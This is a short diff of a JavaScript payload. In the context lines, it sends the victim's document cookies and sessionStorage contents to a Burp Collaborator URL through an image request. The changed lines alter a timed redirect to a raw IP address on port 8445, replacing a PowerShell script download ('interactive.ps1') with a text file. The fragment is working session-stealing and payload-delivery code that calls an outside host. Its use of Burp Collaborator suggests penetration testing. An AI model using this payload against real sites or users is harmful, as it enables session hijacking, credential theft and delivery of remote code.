@@ -8,6 +8,6 @@ new Image().src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(documen
                   "&sessionStorage=" + encodeURIComponent(sessionStorageData);
 
 setTimeout(function() {
-    window.location.href = "http://13.203.103.154:8445/interactive.ps1";
+    window.location.href = "http://13.203.103.154:8445/test.txt";
 }, 5000);
 
